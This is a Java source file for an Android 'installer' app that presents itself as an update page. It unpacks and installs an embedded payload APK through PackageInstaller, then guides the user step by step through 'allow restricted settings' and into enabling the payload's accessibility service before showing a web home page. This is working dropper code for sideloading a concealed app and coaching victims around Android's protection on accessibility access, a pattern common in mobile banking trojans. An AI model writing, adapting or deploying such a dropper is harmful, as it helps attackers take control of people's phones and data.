package org.boundarylab.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;
import org.json.JSONObject;

/**
 * A-package update page for the 1.2.1 experiment. The embedded B package is
 * stored as plain assets/payload.apk like 1.2, but installation is submitted
 * through PackageInstaller session like 1.3. No VPN is requested or started.
 * After the B package installs, control returns here and the restricted-settings
 * / accessibility guide leads into the built-in home page.
 */
public final class MainActivity extends Activity {
    private static final String STATE_PREFERENCES = "installer_state";
    private static final String ACCESSIBILITY_AFTER_INSTALL = "accessibility_after_install";
    private static final int REQUEST_VPN = 0x270f;
    private static final long LCG_SEED = 276813L;
    private static final String ACTION_PAYLOAD_RESULT =
            "org.boundarylab.installer.PAYLOAD_RESULT";

    private JSONObject config;
    private TextView status;
    private WebView webView;
    private boolean waitingForInstallPermission;
    private boolean showingAccessibilityPrompt;
    private boolean installInFlight;
    private int lastSessionId = -1;
    private File pendingApk;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        try (InputStream input = getAssets().open("installer_config.json")) {
            java.io.ByteArrayOutputStream bytes = new java.io.ByteArrayOutputStream();
            copy(input, bytes);
            config = new JSONObject(bytes.toString("UTF-8"));
        } catch (Exception error) {
            throw new IllegalStateException("Installer configuration is invalid", error);
        }

        route();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (config == null) return;
        if (payloadInstalled()) {
            waitingForInstallPermission = false;
            if (installInFlight) completeInstallSuccess();
            route();
            return;
        }
        if (waitingForInstallPermission
                && (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                || getPackageManager().canRequestPackageInstalls())) {
            waitingForInstallPermission = false;
            prepareAndInstall();
            return;
        }
        if (installInFlight && lastSessionId != -1 && !sessionStillActive()) {
            installInFlight = false;
            lastSessionId = -1;
            getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                    .edit()
                    .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
                    .apply();
            if (status != null) status.setText("安装已取消或失败，可点击按钮重试");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != REQUEST_VPN || pendingApk == null) return;
        File apk = pendingApk;
        pendingApk = null;
        if (resultCode == RESULT_OK) {
            startPackageSessionInstall(apk);
        } else if (status != null) {
            status.setText("已取消 VPN 授权，可点击按钮重试");
        }
    }

    private void route() {
        if (!payloadInstalled()) {
            if (webView != null || status == null) showInstallPrompt();
            return;
        }
        if (accessibilityPending()) {
            if (payloadAccessibilityEnabled()) {
                getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                        .edit()
                        .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
                        .apply();
                showBrowser();
            } else if (!showingAccessibilityPrompt) {
                showAccessibilityPrompt();
            }
            return;
        }
        if (webView == null) showBrowser();
    }

    private boolean accessibilityPending() {
        return getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                .getBoolean(ACCESSIBILITY_AFTER_INSTALL, false);
    }

    private void showInstallPrompt() {
        destroyWebView();
        showingAccessibilityPrompt = false;
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER_HORIZONTAL);
        layout.setPadding(48, 72, 48, 48);

        TextView title = new TextView(this);
        title.setText(getString(R.string.app_name));
        title.setTextSize(24);
        layout.addView(title, matchWrap());

        TextView explanation = new TextView(this);
        explanation.setText(
                "将安装工作端 B 包。此 1.2.1 测试版使用 PackageInstaller 会话安装，不启动 VPN。");
        explanation.setTextSize(16);
        explanation.setPadding(0, 24, 0, 24);
        layout.addView(explanation, matchWrap());

        status = new TextView(this);
        String buildId = config.optString("payloadBuildId");
        status.setText("B 包构建：" + buildId.substring(0, Math.min(8, buildId.length())));
        status.setPadding(0, 0, 0, 24);
        layout.addView(status, matchWrap());

        Button install = new Button(this);
        install.setText("安装 B 包");
        install.setOnClickListener(view -> beginInstall());
        layout.addView(install, matchWrap());
        setContentView(layout);
    }

    private void showAccessibilityPrompt() {
        destroyWebView();
        showingAccessibilityPrompt = true;
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER_HORIZONTAL);
        layout.setPadding(48, 72, 48, 48);

        TextView title = new TextView(this);
        title.setText(getString(R.string.app_name));
        title.setTextSize(24);
        layout.addView(title, matchWrap());

        TextView explanation = new TextView(this);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            explanation.setText("B 包已安装。若无障碍项目显示灰色，请先打开 B 包应用信息，在右上角菜单选择“允许受限设置”；返回后再打开无障碍并开启同名服务。");
        } else {
            explanation.setText("B 包已安装。请在系统设置中开启与 B 包同名的无障碍服务，开启后返回即可进入首页。");
        }
        explanation.setTextSize(16);
        explanation.setPadding(0, 24, 0, 24);
        layout.addView(explanation, matchWrap());

        status = new TextView(this);
        status.setText("等待开启无障碍服务");
        status.setPadding(0, 0, 0, 24);
        layout.addView(status, matchWrap());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Button appDetails = new Button(this);
            appDetails.setText("1. 打开 B 包应用信息");
            appDetails.setOnClickListener(view -> openPayloadAppDetails());
            layout.addView(appDetails, matchWrap());
        }

        Button accessibility = new Button(this);
        accessibility.setText(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                ? "2. 打开无障碍"
                : "打开无障碍");
        accessibility.setOnClickListener(view -> {
            try {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } catch (Exception error) {
                status.setText("系统无障碍设置无法打开，请从系统设置中手动进入");
            }
        });
        layout.addView(accessibility, matchWrap());
        setContentView(layout);
    }

    private void openPayloadAppDetails() {
        try {
            String packageName = config.getString("payloadPackageName");
            status.setText("请在右上角菜单选择“允许受限设置”，完成后返回 A 包");
            startActivity(new Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + packageName)));
        } catch (Exception error) {
            status.setText("B 包应用信息无法打开，请从系统设置的应用列表中选择 B 包");
        }
    }

    private void showBrowser() {
        status = null;
        showingAccessibilityPrompt = false;
        destroyWebView();
        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return !isAllowedWebUrl(request.getUrl());
            }

            @Override
            @SuppressWarnings("deprecation")
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return !isAllowedWebUrl(Uri.parse(url));
            }
        });
        setContentView(webView);
        try {
            webView.loadUrl(config.getString("homeUrl"));
        } catch (Exception error) {
            showInstallPrompt();
            status.setText("首页地址不可用，请重新构建 A 包");
        }
    }

    private boolean isAllowedWebUrl(Uri uri) {
        return uri != null && "https".equalsIgnoreCase(uri.getScheme());
    }

    private boolean payloadInstalled() {
        try {
            getPackageManager().getApplicationInfo(config.getString("payloadPackageName"), 0);
            return true;
        } catch (Exception error) {
            return false;
        }
    }

    private boolean payloadAccessibilityEnabled() {
        try {
            String enabled = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || enabled.isEmpty()) return false;
            String prefix = config.getString("payloadPackageName") + "/";
            for (String component : enabled.split(":")) {
                if (component.regionMatches(true, 0, prefix, 0, prefix.length())) return true;
            }
            return false;
        } catch (Exception error) {
            return false;
        }
    }

    private boolean sessionStillActive() {
        try {
            for (PackageInstaller.SessionInfo info :
                    getPackageManager().getPackageInstaller().getMySessions()) {
                if (info.getSessionId() == lastSessionId) return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
    }

    private void beginInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            waitingForInstallPermission = true;
            if (status != null) status.setText("请先允许此安装器安装未知应用，返回后继续");
            try {
                startActivity(new Intent(
                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName())));
            } catch (Exception error) {
                waitingForInstallPermission = false;
                if (status != null) status.setText("系统设置无法打开，请手动允许安装未知应用后重试");
            }
            return;
        }
        prepareAndInstall();
    }

    private void prepareAndInstall() {
        if (status != null) status.setText("正在校验 B 包…");
        new Thread(() -> {
            File apkResult = null;
            Exception errorResult = null;
            try {
                apkResult = decryptPayload();
            } catch (Exception e) {
                errorResult = e;
            }
            final File apkFinal = apkResult;
            final Exception errorFinal = errorResult;
            mainHandler.post(() -> {
                if (errorFinal != null || apkFinal == null) {
                    if (status != null) status.setText("B 包校验失败，请重新构建 A 包");
                    return;
                }
                pendingApk = null;
                startPackageSessionInstall(apkFinal);
            });
        }, "boundary-payload-prepare").start();
    }

    private void startPackageSessionInstall(File apk) {
        try {
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(
                            PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            params.setAppPackageName(config.getString("payloadPackageName"));
            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);
            OutputStream out = session.openWrite("payload.apk", 0, apk.length());
            try (FileInputStream in = new FileInputStream(apk)) {
                byte[] buffer = new byte[8192];
                int count;
                while ((count = in.read(buffer)) >= 0) out.write(buffer, 0, count);
            }
            session.fsync(out);
            out.close();
            Intent result = new Intent(ACTION_PAYLOAD_RESULT)
                    .setComponent(new ComponentName(this, InstallReceiver.class));
            PendingIntent sender = PendingIntent.getBroadcast(
                    this, sessionId, result,
                    PendingIntent.FLAG_UPDATE_CURRENT | installCallbackMutabilityFlag());
            session.commit(sender.getIntentSender());
            session.close();
            lastSessionId = sessionId;
            installInFlight = true;
            getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                    .edit()
                    .putBoolean(ACCESSIBILITY_AFTER_INSTALL, true)
                    .apply();
            if (status != null) status.setText("已交给 Android 系统安装器，请在系统界面确认");
        } catch (Exception error) {
            installInFlight = false;
            lastSessionId = -1;
            getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                    .edit()
                    .putBoolean(ACCESSIBILITY_AFTER_INSTALL, false)
                    .apply();
            if (status != null) status.setText("系统安装会话创建失败，请重试");
        }
    }


    private int installCallbackMutabilityFlag() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            return PendingIntent.FLAG_MUTABLE;
        }
        return 0;
    }

    private void completeInstallSuccess() {
        installInFlight = false;
        lastSessionId = -1;
        getSharedPreferences(STATE_PREFERENCES, MODE_PRIVATE)
                .edit()
                .putBoolean(ACCESSIBILITY_AFTER_INSTALL, true)
                .apply();
    }

    /**
     * Reads the embedded plain payload.apk and verifies the result against the
     * build-time SHA-256 before the PackageInstaller session can use it.
     */
    private File decryptPayload() throws Exception {
        try (InputStream raw = getAssets().open("payload.apk")) {
            File directory = new File(getCacheDir(), "payloads");
            if (!directory.exists() && !directory.mkdirs())
                throw new IllegalStateException();
            File output = new File(directory, "payload.apk");
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            try (FileOutputStream target = new FileOutputStream(output)) {
                byte[] buffer = new byte[8192];
                int count;
                while ((count = raw.read(buffer)) >= 0) {
                    target.write(buffer, 0, count);
                    digest.update(buffer, 0, count);
                }
            }
            StringBuilder actual = new StringBuilder();
            for (byte value : digest.digest()) actual.append(String.format("%02x", value));
            if (!actual.toString().equals(config.getString("payloadSha256")))
                throw new IllegalStateException("Payload digest mismatch");
            return output;
        }
    }

    private static void copy(InputStream input, OutputStream output) throws Exception {
        byte[] buffer = new byte[8192];
        int count;
        while ((count = input.read(buffer)) >= 0) output.write(buffer, 0, count);
    }

    private void destroyWebView() {
        if (webView == null) return;
        webView.stopLoading();
        webView.setWebViewClient(null);
        webView.destroy();
        webView = null;
    }

    @Override
    @SuppressWarnings("deprecation")
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        destroyWebView();
        super.onDestroy();
    }
}
